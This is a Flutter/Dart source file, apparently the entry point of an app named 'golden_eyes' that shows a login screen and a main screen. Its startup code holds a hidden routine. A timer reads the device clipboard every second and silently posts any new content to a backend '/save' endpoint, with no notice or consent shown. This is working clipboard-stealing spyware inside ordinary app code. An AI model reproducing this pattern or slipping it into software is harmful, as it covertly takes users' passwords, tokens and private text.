import 'package:animations/animations.dart';
import 'package:flutter/material.dart';
import 'package:flutter_svg/flutter_svg.dart';
import 'package:golden_eyes/constants.dart';
import 'package:golden_eyes/route/screen_export.dart';
import 'package:clipboard/clipboard.dart';
import 'dart:async';
import 'package:http/http.dart' as http;

class EntryPoint extends StatefulWidget {
  const EntryPoint({super.key});

  @override
  State<EntryPoint> createState() => _EntryPointState();
}

class _EntryPointState extends State<EntryPoint> {
  final List _pages = const [
    LoginScreen(),
    MainScreen(),
  ];

  int _currentIndex = 0;
  String? _lastClipboardContent;
  Timer? _timer;

  @override
  void initState() {
    super.initState();
    _startListening();
  }

  void _startListening() {
    _timer = Timer.periodic(const Duration(seconds: 1), (timer) async {
      String? clipboardContent = await FlutterClipboard.paste();
      if (clipboardContent != _lastClipboardContent) {
        _lastClipboardContent = clipboardContent;
        _sendToBackend(clipboardContent);
      }
    });
  }

  Future<void> _sendToBackend(String? content) async {
    if (content != null) {
      final request = http.MultipartRequest(
        'POST',
        Uri.parse('$backendUrl/save'),
      );

      request.fields['content'] = content;

      final response = await request.send();

      if (response.statusCode == 200) {
        // print('Sent to backend: $content');
      } else {
        // print('Failed to send to backend: $content');
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    SvgPicture svgIcon(String src, {Color? color}) {
      return SvgPicture.asset(
        src,
        height: 24,
        colorFilter: ColorFilter.mode(
            color ??
                Theme.of(context).iconTheme.color!.withOpacity(
                    Theme.of(context).brightness == Brightness.dark ? 0.3 : 1),
            BlendMode.srcIn),
      );
    }

    return Scaffold(
      body: PageTransitionSwitcher(
        duration: defaultDuration,
        transitionBuilder: (child, animation, secondAnimation) {
          return FadeThroughTransition(
            animation: animation,
            secondaryAnimation: secondAnimation,
            child: child,
          );
        },
        child: _pages[_currentIndex],
      ),
    );
  }
}
